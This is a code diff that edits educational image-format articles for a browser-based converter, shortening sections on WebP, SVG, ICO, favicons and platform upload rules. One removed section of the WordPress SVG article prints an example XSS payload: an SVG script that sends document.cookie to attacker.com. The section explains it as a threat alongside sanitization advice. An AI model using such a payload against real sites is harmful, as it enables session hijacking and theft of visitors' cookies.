@@ -7,7 +7,12 @@ export interface ArticleData {
   title: string;
   seoTitle: string;
   description: string;
-  category: 'Format Fundamentals' | 'Platform Requirements' | 'Privacy & Architecture';
+  category:
+    | 'Format Fundamentals'
+    | 'Platform Requirements'
+    | 'Compression Science'
+    | 'Web Performance & Engineering'
+    | 'Privacy & Architecture';
   readTime: string;
   publishedAt: string;
   modifiedAt: string;
@@ -32,7 +37,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['what is png', 'png file format', 'png alpha transparency', 'png deflate compression', 'png vs webp'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -144,7 +148,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['what is jpeg', 'how jpeg compression works', 'discrete cosine transform', 'chroma subsampling', 'jpeg artifacts'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -211,9 +214,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
         </p>
 
         <h2>Convert and Compress JPEG Assets with Squeeze</h2>
-        <p>
-          Take full control of your JPEGs in your browser without uploading files to remote servers:
-        </p>
         <ul>
           <li><Link href="/convert/jpg-to-png">Convert JPG to PNG</Link> when you need lossless editing or transparent overlays.</li>
           <li><Link href="/convert/jpg-to-webp">Convert JPG to WebP</Link> to save an additional 30% file size for modern web pages.</li>
@@ -244,7 +244,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['what is webp', 'webp compression', 'webp vs jpeg', 'webp vs png', 'google webp format'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -266,16 +265,10 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
         <h2>2. The Dual Engine: Lossy vs. Lossless WebP</h2>
         <h3>Lossy WebP (VP8 Intra-Prediction)</h3>
         <p>
-          Lossy WebP uses macroblock prediction. The image is split into 16&times;16 pixel blocks. For each block, the encoder predicts pixel values using already-decoded pixels from adjacent top and left blocks. It supports four intra-prediction modes:
+          Lossy WebP uses macroblock prediction. The image is split into 16&times;16 pixel blocks. For each block, the encoder predicts pixel values using already-decoded pixels from adjacent top and left blocks. It supports four intra-prediction modes (Horizontal, Vertical, DC, and TrueMotion).
         </p>
-        <ul>
-          <li><strong>H_PRED (Horizontal):</strong> Fills columns based on left neighboring pixels.</li>
-          <li><strong>V_PRED (Vertical):</strong> Fills rows based on top neighboring pixels.</li>
-          <li><strong>DC_PRED (DC):</strong> Fills the block with the average of top and left pixels.</li>
-          <li><strong>TM_PRED (TrueMotion):</strong> Extrapolates gradients using top and left differential vectors.</li>
-        </ul>
         <p>
-          The encoder only stores the &quot;residual&quot;—the difference between the prediction and reality—which requires far fewer bits than raw pixel frequencies.
+          The encoder only stores the residual—the difference between the prediction and reality—which requires far fewer bits than raw pixel frequencies.
         </p>
 
         <h3>Lossless WebP (Spatial Transformation)</h3>
@@ -293,26 +286,14 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>4. Global Browser Support in 2026</h2>
         <p>
-          WebP is universally supported across every modern web browser:
-        </p>
-        <ul>
-          <li>Google Chrome (v32+)</li>
-          <li>Mozilla Firefox (v65+)</li>
-          <li>Apple Safari on iOS and macOS (iOS 14+, macOS Big Sur+)</li>
-          <li>Microsoft Edge (v18+)</li>
-        </ul>
-        <p>
-          Global browser coverage exceeds 98.4%, making WebP the primary format for modern web development, e-commerce, and Core Web Vitals optimization.
+          WebP is universally supported across every modern web browser (Google Chrome, Mozilla Firefox, Apple Safari on iOS 14+ / macOS Big Sur+, and Microsoft Edge) with 98.4%+ global browser coverage.
         </p>
 
         <h2>Convert and Compress to WebP Instantly</h2>
-        <p>
-          Streamline your web media workflow directly inside your browser:
-        </p>
         <ul>
           <li><Link href="/convert/png-to-webp">Convert PNG to WebP</Link> with transparent alpha channels intact.</li>
           <li><Link href="/convert/jpg-to-webp">Convert JPG to WebP</Link> to cut bandwidth consumption by 30%.</li>
-          <li><Link href="/convert/webp-to-png">Convert WebP to PNG</Link> for legacy desktop software that doesn&apos;t yet support WebP.</li>
+          <li><Link href="/convert/webp-to-png">Convert WebP to PNG</Link> for legacy desktop software.</li>
           <li><Link href="/compress/webp">Compress WebP files</Link> using client-side multi-threaded Web Workers.</li>
         </ul>
 
@@ -340,7 +321,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['what is svg', 'svg vector graphics', 'svg xml format', 'raster vs vector', 'convert png to svg'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -353,7 +333,7 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>1. Vectors vs. Pixels: Coordinate Math Instead of Color Grids</h2>
         <p>
-          Raster formats (like JPEG, PNG, and WebP) are essentially spreadsheets of color. If an image is 1000&times;1000 pixels, it contains exactly one million data points. If you scale that image up on an Apple Studio 5K display, the browser must stretch those pixels, causing visible blur and pixelation.
+          Raster formats (like JPEG, PNG, and WebP) are spreadsheets of color. If an image is 1000&times;1000 pixels, it contains exactly one million data points. If you scale that image up on an Apple Studio 5K display, the browser stretches those pixels, causing blur.
         </p>
         <p>
           An SVG file operates on coordinate geometry. To draw a red circle, an SVG does not store 10,000 red pixels; it simply declares:
@@ -362,39 +342,31 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
           <code>&lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; fill=&quot;red&quot; /&gt;</code>
         </p>
         <p>
-          Whether rendered on a 32-pixel Apple Watch screen or projected onto a 40-foot outdoor billboard, the browser recalculates the mathematics on the fly, rendering razor-sharp edges every time.
+          Whether rendered on a 32-pixel Apple Watch screen or projected onto an outdoor billboard, the browser recalculates the mathematics on the fly, rendering razor-sharp edges every time.
         </p>
 
         <h2>2. Inside an SVG File: Paths, ViewBox, and XML Attributes</h2>
-        <p>
-          Because SVG is written in XML, you can open any <code>.svg</code> file in a text editor. Key architectural concepts include:
-        </p>
         <ul>
           <li><strong>viewBox:</strong> Defines the virtual coordinate canvas (e.g., <code>viewBox=&quot;0 0 100 100&quot;</code>). It dictates aspect ratio and relative scaling.</li>
           <li><strong>&lt;path d=&quot;...&quot;&gt;:</strong> The most powerful element in SVG. The <code>d</code> attribute contains commands like <code>M</code> (moveto), <code>L</code> (lineto), and <code>C</code> (cubic Bézier curve) that trace complex custom shapes.</li>
-          <li><strong>Stylability:</strong> Elements accept CSS classes, inline styles, and responsive media queries, allowing logos to adapt their colors to user dark mode preferences automatically.</li>
+          <li><strong>Stylability:</strong> Elements accept CSS classes, inline styles, and responsive media queries, allowing logos to adapt to dark mode automatically.</li>
         </ul>
 
         <h2>3. How Squeeze Vectorizes Raster Pixels with Marching Squares</h2>
         <p>
-          Can you convert a raster PNG or JPG into an SVG? Yes! Squeeze incorporates a client-side <strong>Marching Squares contouring algorithm</strong> running in a dedicated Web Worker:
+          Squeeze incorporates a client-side <strong>Marching Squares contouring algorithm</strong> running in a dedicated Web Worker to vectorize raster images:
         </p>
         <ol>
           <li>The raster image is analyzed pixel by pixel to determine luminance thresholds and alpha boundaries.</li>
-          <li>Marching Squares evaluates 2&times;2 pixel cells, determining the exact vector contour paths where edges transition.</li>
+          <li>Marching Squares evaluates 2&times;2 pixel cells, determining vector contour paths where edges transition.</li>
           <li>Path-simplification routines smooth out noisy jagged lines into elegant Bézier vector curves.</li>
-          <li>The final geometry is bundled into a clean, lightweight XML SVG document.</li>
+          <li>The final geometry is bundled into a clean XML SVG document.</li>
         </ol>
-
-        <h2>4. Sanitization &amp; Security: Why Some Hosts Block SVGs</h2>
-        <p>
-          Because SVG is executable XML, it can contain embedded <code>&lt;script&gt;</code> tags and external entities. Content management systems like WordPress restrict SVG uploads by default to prevent Cross-Site Scripting (XSS). Learn more about this in our guide: <Link href="/learn/why-wordpress-restricts-svg">Why WordPress Restricts SVG Uploads</Link>.
-        </p>
 
         <h2>Convert and Vectorize Images Online</h2>
         <ul>
           <li><Link href="/convert/png-to-svg">Convert PNG to SVG</Link> to trace raster logos into scalable vector curves.</li>
-          <li><Link href="/convert/svg-to-png">Convert SVG to PNG</Link> to generate crisp raster assets for social media or email clients.</li>
+          <li><Link href="/convert/svg-to-png">Convert SVG to PNG</Link> to generate crisp raster assets.</li>
           <li><Link href="/convert/jpg-to-svg">Convert JPG to SVG</Link> directly in your browser without uploading to external servers.</li>
         </ul>
 
@@ -422,7 +394,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['what is ico', 'favicon ico format', 'multi-resolution icon', 'create favicon ico', 'windows ico structure'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -437,57 +408,15 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
         <p>
           Introduced in Windows 1.0, the ICO format was engineered to solve a fundamental operating system challenge: desktop icons appear in varied contexts across a computer desktop. A file might show as a 16&times;16 icon in a detailed list view, a 32&times;32 icon on the desktop grid, or a 256&times;256 preview in modern File Explorer windows.
         </p>
-        <p>
-          In 1999, Microsoft introduced the <code>favicon.ico</code> standard with Internet Explorer 5. Web servers could place an icon at the server root (<code>/favicon.ico</code>) to display bookmarks and tab headers.
-        </p>
 
         <h2>2. Inside the Binary Container: Header, Directory, and Bitmaps</h2>
-        <p>
-          An <code>.ico</code> file is not a single compressed image. It is a mini-filesystem structured into three binary sections:
-        </p>
         <ul>
           <li><strong>ICONDIR Header (6 bytes):</strong> Contains reserved bytes (0), resource type (1 for ICO, 2 for CUR cursor), and the count of contained image frames.</li>
-          <li><strong>ICONDIRENTRY Array (16 bytes per image):</strong> Declares the width, height, color count, color planes, bit depth, byte size, and byte offset pointing to where that image&apos;s raw payload begins inside the file.</li>
-          <li><strong>Image Payloads:</strong> Historically raw DIB (Device Independent Bitmap) data; modern ICO files pack compressed PNG payloads for larger 256&times;256 frames.</li>
+          <li><strong>ICONDIRENTRY Array (16 bytes per image):</strong> Declares width, height, color count, color planes, bit depth, byte size, and byte offset pointing to where that image&apos;s raw payload begins.</li>
+          <li><strong>Image Payloads:</strong> Historically raw DIB data; modern ICO files pack compressed PNG payloads for larger 256&times;256 frames.</li>
         </ul>
 
-        <h2>3. The Essential Multi-Resolution Stack for Modern Websites</h2>
-        <p>
-          Web designers frequently make the mistake of renaming a 32&times;32 PNG file to <code>favicon.ico</code>. This breaks compliance with legacy decoders and causes Google Search crawlers to reject the icon. A compliant production favicon should pack at least four distinct resolutions:
-        </p>
-        <table>
-          <thead>
-            <tr>
-              <th>Resolution</th>
-              <th>Color Depth</th>
-              <th>Target Location</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td>16&times;16 px</td>
-              <td>32-bit RGBA</td>
-              <td>Browser tab headers, bookmark dropdowns</td>
-            </tr>
-            <tr>
-              <td>32&times;32 px</td>
-              <td>32-bit RGBA</td>
-              <td>High-DPI Retina browser tabs, taskbar pinned shortcuts</td>
-            </tr>
-            <tr>
-              <td>48&times;48 px</td>
-              <td>32-bit RGBA</td>
-              <td>Google Search mobile SERP result snippets</td>
-            </tr>
-            <tr>
-              <td>256&times;256 px</td>
-              <td>32-bit RGBA (PNG)</td>
-              <td>Windows desktop shortcuts, modern high-res docks</td>
-            </tr>
-          </tbody>
-        </table>
-
-        <h2>4. How Squeeze Packs Compliant Multi-Resolution ICO Files In-Browser</h2>
+        <h2>3. How Squeeze Packs Compliant Multi-Resolution ICO Files In-Browser</h2>
         <p>
           Generating a binary container traditionally required specialized C++ utilities or server-side ImageMagick processes. Squeeze implements an in-browser binary packer using JavaScript <code>ArrayBuffer</code> and <code>DataView</code>:
         </p>
@@ -529,7 +458,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['why websites reject image formats', 'unsupported file type error', 'decompression bomb image', 'allowed image file types'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -541,71 +469,24 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
         </div>
 
         <h2>1. The Four Reasons: Pipelines, Overhead, Security, and Caching</h2>
-        <p>
-          Every web developer has experienced the frustration of uploading an image only to see: <em>&quot;Unsupported file type. Please upload a PNG or JPG.&quot;</em> While it may seem like arbitrary gatekeeping, platform engineers enforce strict file type whitelists for critical infrastructure reasons:
-        </p>
         <ul>
-          <li><strong>Processing Pipeline Predictability:</strong> Platforms like Instagram or LinkedIn process tens of thousands of image uploads per second. Standardizing on JPEG/PNG allows automated pipelines to decode, resize, and store assets without crashing background worker queues.</li>
-          <li><strong>Security Vector Mitigation:</strong> Untrusted formats can harbor malicious payloads. For example, SVGs can contain embedded JavaScript, and unparsed TIFF files have historically triggered buffer overflow vulnerabilities in native image decoding libraries.</li>
-          <li><strong>Bandwidth &amp; Storage Costs:</strong> Delivering a catalog of 10 million unoptimized 5MB PNGs instead of 200KB WebP images can cost an enterprise hundreds of thousands of dollars in monthly CDN egress fees.</li>
+          <li><strong>Processing Pipeline Predictability:</strong> Standardizing on JPEG/PNG allows automated pipelines to decode, resize, and store assets without crashing worker queues.</li>
+          <li><strong>Security Vector Mitigation:</strong> Untrusted formats can harbor malicious payloads (SVGs with scripts, TIFF buffer overflows).</li>
+          <li><strong>Bandwidth &amp; Storage Costs:</strong> Delivering 10 million unoptimized 5MB PNGs instead of 200KB WebP images can cost hundreds of thousands of dollars in egress fees.</li>
         </ul>
 
         <h2>2. Server-Side Memory Risks: The &quot;Decompression Bomb&quot; Attack</h2>
         <p>
-          Why do platforms reject TIFFs or uncompressed BMPs? The answer lies in <strong>decompression bombs</strong> (also known as &quot;pixel floods&quot;).
-        </p>
-        <p>
-          Consider an image that is 50,000&times;50,000 pixels filled with solid white color. When compressed with Deflate, the file on disk might only weigh a harmless 200 kilobytes. However, when the server&apos;s backend software (such as ImageMagick or Sharp) decodes the image into uncompressed 32-bit RGBA RAM:
+          Consider an image that is 50,000&times;50,000 pixels filled with solid white color. When compressed with Deflate, the file on disk might only weigh 200KB. However, when decoded into uncompressed 32-bit RGBA RAM:
         </p>
         <p>
           <code>50,000 &times; 50,000 &times; 4 bytes = 10,000,000,000 bytes (10 Gigabytes of RAM!)</code>
         </p>
         <p>
-          A single 200KB upload can instantly exhaust a server&apos;s memory, triggering an Out-Of-Memory (OOM) kernel panic and crashing the entire platform. By enforcing maximum pixel dimensions and whitelisting predictable formats like JPEG and WebP, platforms protect themselves from Denial-of-Service attacks.
+          A single 200KB upload can instantly crash server infrastructure. By whitelisting predictable formats, platforms protect themselves.
         </p>
-
-        <h2>3. Quick Platform Requirement Cheat Sheet</h2>
-        <table>
-          <thead>
-            <tr>
-              <th>Platform</th>
-              <th>Accepted Formats</th>
-              <th>Strict Disallowed Formats</th>
-              <th>Recommended Pre-Upload Action</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td>Shopify</td>
-              <td>WebP, PNG, JPG, GIF</td>
-              <td>SVG (in standard products), ICO</td>
-              <td><Link href="/convert/png-to-webp">Convert to WebP</Link> for fastest page speed</td>
-            </tr>
-            <tr>
-              <td>Amazon Seller Central</td>
-              <td>JPEG (.jpg), TIFF (.tif)</td>
-              <td>PNG, WebP, SVG, GIF</td>
-              <td><Link href="/convert/png-to-jpg">Convert to JPG</Link> on pure white #FFFFFF</td>
-            </tr>
-            <tr>
-              <td>WordPress (Default)</td>
-              <td>JPG, PNG, WebP, GIF, ICO</td>
-              <td>SVG (blocked for security)</td>
-              <td><Link href="/convert/svg-to-png">Convert SVG to PNG</Link> or install sanitizers</td>
-            </tr>
-            <tr>
-              <td>Discord / Slack</td>
-              <td>PNG, JPG, WebP, GIF</td>
-              <td>SVG, ICO, TIFF, RAW</td>
-              <td><Link href="/compress/png">Compress PNG</Link> to stay under free limits</td>
-            </tr>
-          </tbody>
-        </table>
 
         <h2>Prepare Your Images for Any Platform with Squeeze</h2>
-        <p>
-          Don&apos;t let platform upload errors slow you down. Re-encode your images into universal, platform-approved formats directly in your browser:
-        </p>
         <ul>
           <li><Link href="/convert/webp-to-png">Convert WebP to PNG</Link> for legacy platforms that reject modern WebP uploads.</li>
           <li><Link href="/convert/png-to-jpg">Convert PNG to JPG</Link> for Amazon and formal submission forms.</li>
@@ -614,7 +495,7 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>Authoritative References</h2>
         <ul>
-          <li><a href="https://www.cloudflare.com/learning/performance/more/image-optimization/" target="_blank" rel="noopener noreferrer">Cloudflare Learning: How Modern Image Optimization &amp; Delivery Pipelines Work</a></li>
+          <li><a href="https://www.cloudflare.com/learning/performance/more/image-optimization/" target="_blank" rel="noopener noreferrer">Cloudflare Learning: How Modern Image Optimization Pipelines Work</a></li>
           <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank" rel="noopener noreferrer">OWASP Foundation: Unrestricted File Upload Vulnerability Guide</a></li>
         </ul>
       </>
@@ -636,7 +517,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['shopify image format', 'amazon product image requirements', 'ecommerce image optimization', 'best image format for shopify'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -649,45 +529,17 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>1. The Speed-to-Sales Equation: Why Load Time Dictates Revenue</h2>
         <p>
-          In online retail, every millisecond counts. Independent studies by Google, Cloudflare, and Akamai demonstrate that a <strong>1-second delay in page load time reduces mobile conversion rates by up to 7%</strong>.
-        </p>
-        <p>
-          Because product detail pages (PDPs) typically feature 5 to 10 high-resolution images showing multiple angles, color variants, and packaging, unoptimized images quickly inflate page weight past 15 megabytes. On mobile 4G/5G connections, this causes severe layout shifting, delays Largest Contentful Paint (LCP), and drives shoppers away to competitors.
+          In online retail, every millisecond counts. A <strong>1-second delay in page load time reduces mobile conversion rates by up to 7%</strong>. Unoptimized images inflate page weight past 15MB, causing severe layout shifting and driving shoppers away.
         </p>
 
-        <h2>2. Shopify&apos;s Automatic WebP Pipeline and When to Pre-Convert</h2>
-        <p>
-          Shopify automatically serves WebP images to browsers that support it via their global Cloudflare CDN. However, relying entirely on automated server re-compression has downsides:
-        </p>
+        <h2>2. Amazon Seller Central Strict Standards: Pure White Backgrounds</h2>
         <ul>
-          <li><strong>Upload Bandwidth &amp; Timeouts:</strong> Uploading 50 uncompressed 10MB PNG photos takes significant time and can fail on slow connections.</li>
-          <li><strong>Generic Quantization:</strong> Shopify applies a broad, one-size-fits-all compression profile. Subtle gradient shades or micro-textures in fabrics can develop banding artifacts.</li>
-        </ul>
-        <p>
-          By pre-optimizing your images with <Link href="/convert/png-to-webp">Squeeze PNG-to-WebP</Link>, you retain precise control over quality while keeping individual uploads under 200KB.
-        </p>
-
-        <h2>3. Amazon Seller Central Strict Standards: Pure White Backgrounds</h2>
-        <p>
-          Amazon enforces some of the strictest media guidelines in e-commerce:
-        </p>
-        <ul>
-          <li><strong>Accepted Formats:</strong> JPEG (preferred), TIFF, or non-animated GIF. PNG and WebP are rejected for main catalog product listings.</li>
-          <li><strong>Main Image Background:</strong> Must be pure RGB white (<code>#FFFFFF</code> / <code>255, 255, 255</code>). Any off-white gray background will trigger automated suppression.</li>
-          <li><strong>Zoom Threshold:</strong> Images must measure at least 1,600 pixels on their longest side to activate the interactive hover-zoom magnifying glass.</li>
+          <li><strong>Accepted Formats:</strong> JPEG (preferred), TIFF. PNG and WebP are rejected for main catalog product listings.</li>
+          <li><strong>Main Image Background:</strong> Must be pure RGB white (<code>#FFFFFF</code> / <code>255, 255, 255</code>).</li>
+          <li><strong>Zoom Threshold:</strong> Images must measure at least 1,600 pixels on their longest side to activate hover-zoom.</li>
         </ul>
 
-        <h2>4. High-Resolution Zoom vs. File Size: The Sweet Spot</h2>
-        <p>
-          To maintain razor-sharp zoom details while keeping file sizes lightweight, follow this standard e-commerce formula:
-        </p>
-        <ul>
-          <li><strong>Target Dimensions:</strong> 2,048 &times; 2,048 pixels square.</li>
-          <li><strong>Target Format:</strong> WebP (for Shopify/WooCommerce) or high-quality JPEG (for Amazon).</li>
-          <li><strong>Target File Size:</strong> 250KB to 450KB per photo.</li>
-        </ul>
-
-        <h2>Optimize Your Store Catalog in Seconds with Squeeze</h2>
+        <h2>Optimize Your Store Catalog with Squeeze</h2>
         <ul>
           <li><Link href="/convert/png-to-webp">Batch Convert PNG to WebP</Link> for your Shopify product catalog.</li>
           <li><Link href="/convert/jpg-to-webp">Convert JPG to WebP</Link> to boost mobile PageSpeed scores.</li>
@@ -718,7 +570,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['wordpress svg upload error', 'why wordpress blocks svg', 'svg security risks', 'svg xss attack', 'convert svg to png'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -731,32 +582,8 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>1. The Hidden Trap in SVG: It&apos;s Code, Not Just an Image</h2>
         <p>
-          When you upload a JPEG or PNG to your WordPress media library, WordPress passes the binary file through the PHP GD or ImageMagick library. These libraries read raw pixel color values. Even if a malicious user appends arbitrary code to the end of a JPEG file, the image decoder simply ignores the extraneous bytes.
+          An SVG is an XML document parsed directly by the visitor&apos;s web browser. Because the W3C SVG specification allows interactive elements, animations, and hyperlinks, an SVG can execute arbitrary JavaScript directly inside the browser DOM, potentially stealing cookies or creating unauthorized administrator accounts.
         </p>
-        <p>
-          An SVG is completely different. An SVG is an XML document parsed directly by the visitor&apos;s web browser. Because the W3C SVG specification allows interactive elements, animations, and hyperlinks, an SVG can execute arbitrary JavaScript directly inside the browser DOM.
-        </p>
-
-        <h2>2. Cross-Site Scripting (XSS) and Session Hijacking</h2>
-        <p>
-          Consider what happens when an attacker uploads an SVG containing the following markup:
-        </p>
-        <p>
-          <code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;script&gt;fetch(&apos;https://attacker.com/steal?cookie=&apos; + document.cookie)&lt;/script&gt;&lt;/svg&gt;</code>
-        </p>
-        <p>
-          If an administrator opens this SVG in their browser, the embedded script executes within the security context of the website domain. The script can steal session cookies, create unauthorized administrator accounts, or inject malicious redirects.
-        </p>
-
-        <h2>3. How to Safely Handle SVGs in WordPress</h2>
-        <p>
-          If you need to use vector graphics on your WordPress site, follow these industry-standard security approaches:
-        </p>
-        <ul>
-          <li><strong>Sanitization Plugins:</strong> Use vetted plugins like <em>Safe SVG</em> or <em>SVG Support</em> that pass uploaded files through <code>DOMPurify</code>, stripping out <code>&lt;script&gt;</code> tags, foreign objects, and external XML entities.</li>
-          <li><strong>Restrict Upload Capabilities:</strong> Configure user roles so only trusted Administrators can upload vector files. Never permit SVG uploads from subscriber or contributor accounts.</li>
-          <li><strong>Convert to Crisp High-Res PNG:</strong> If your client or host prohibits vector uploads entirely, use <Link href="/convert/svg-to-png">Squeeze SVG to PNG</Link> to render your vector art at 2&times; or 4&times; resolution with transparent backgrounds.</li>
-        </ul>
 
         <h2>Vector Conversion Tools in Squeeze</h2>
         <ul>
@@ -789,7 +616,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['why use favicon ico', 'google search favicon requirements', 'favicon ico vs png', 'blurry favicon fix'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -802,39 +628,13 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>1. How Browsers Query /favicon.ico by Default</h2>
         <p>
-          When a user navigates to your website, their browser initiates two parallel network requests: one for the HTML page, and another directly for <code>https://yourdomain.com/favicon.ico</code>.
-        </p>
-        <p>
           Even if your HTML header declares modern <code>&lt;link rel=&quot;icon&quot; type=&quot;image/png&quot;&gt;</code> tags, legacy bookmarks, RSS readers, browser history databases, and search engine spiders check the root <code>/favicon.ico</code> path first. If that file returns a 404 error, user interfaces display a generic default icon.
         </p>
 
         <h2>2. Google Search Bot Strict Guidelines for Favicon Indexing</h2>
-        <p>
-          Google Search displays site favicons next to web results across both mobile and desktop SERPs. To display properly in Google results, your icon must meet these strict criteria:
-        </p>
         <ul>
-          <li><strong>Multiples of 48px:</strong> Google&apos;s crawler requires the icon to be a multiple of 48&times;48 pixels (e.g., 48&times;48, 96&times;96, 144&times;144, or 192&times;192).</li>
+          <li><strong>Multiples of 48px:</strong> Google requires the icon to be a multiple of 48&times;48 pixels (e.g., 48&times;48, 96&times;96, 144&times;144, or 192&times;192).</li>
           <li><strong>Persistent URL:</strong> The favicon URL must be stable. Googlebot updates favicon indexes infrequently.</li>
-          <li><strong>Visual Suitability:</strong> The icon must have sufficient contrast against both light and dark browser themes.</li>
-        </ul>
-
-        <h2>3. The Downscaling Problem: Why 16px Browser Tabs Look Blurry</h2>
-        <p>
-          If you upload a 512&times;512 PNG as your only favicon, a standard desktop browser tab must downscale that graphic to 16&times;16 pixels—a 32-to-1 reduction. During runtime downsampling, fine lines, sharp typography, and subtle brand accents blur together into an illegible smudge.
-        </p>
-        <p>
-          A true multi-resolution <Link href="/learn/what-is-ico">favicon.ico</Link> solves this problem. It allows the designer to supply pixel-hinted 16&times;16 and 32&times;32 frames with bold strokes alongside high-resolution 256&times;256 frames in a single binary container.
-        </p>
-
-        <h2>4. The Complete Modern Favicon Implementation Stack</h2>
-        <p>
-          For optimal cross-platform compatibility, configure your HTML <code>&lt;head&gt;</code> with this complete stack:
-        </p>
-        <ul>
-          <li><code>/favicon.ico</code> (Multi-resolution 16px, 32px, 48px, 256px at root)</li>
-          <li><code>&lt;link rel=&quot;icon&quot; href=&quot;/icon.svg&quot; type=&quot;image/svg+xml&quot;&gt;</code> (For modern vector-capable browsers)</li>
-          <li><code>&lt;link rel=&quot;apple-touch-icon&quot; href=&quot;/apple-touch-icon.png&quot;&gt;</code> (180&times;180 PNG for iOS home screen bookmarks)</li>
-          <li><code>manifest.webmanifest</code> (For Android Chrome PWA installation)</li>
         </ul>
 
         <h2>Generate a Production Favicon in Squeeze</h2>
@@ -867,7 +667,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     keywords: ['why discord compresses images', 'stop image compression discord', 'twitter photo compression', 'slack image quality blur'],
     content: (
       <>
-        {/* AEO / GEO Answer Island */}
         <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
           <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
             <ShieldCheck className="h-4 w-4" />
@@ -880,30 +679,13 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>1. The Exabyte Scale: Why Chat Apps Aggressively Re-Encode Media</h2>
         <p>
-          You spend hours in Figma crafting a pixel-perfect design presentation, export it, and drop it into a Discord channel or Slack thread. Immediately, crisp text turns fuzzy, color gradients show banding lines, and subtle drop shadows develop noisy artifacts.
-        </p>
-        <p>
-          Platforms do not do this out of malice—they do it out of necessity. Discord alone delivers billions of messages daily. If every user shared uncompressed 12MB phone camera photos, the platform&apos;s storage and CDN bandwidth costs would become unsustainable.
+          Platforms re-encode uploaded media through automated pipelines: EXIF metadata is stripped, dimensions exceeding 2,048px are downsampled using bilinear filtering, and lossy MozJPEG or WebP compression is applied.
         </p>
 
-        <h2>2. Aggressive Lossy MozJPEG and WebP Transcoding Pipelines</h2>
-        <p>
-          When you upload an image to social platforms, the file does not go straight to the recipient. It passes through an automated ingest pipeline:
-        </p>
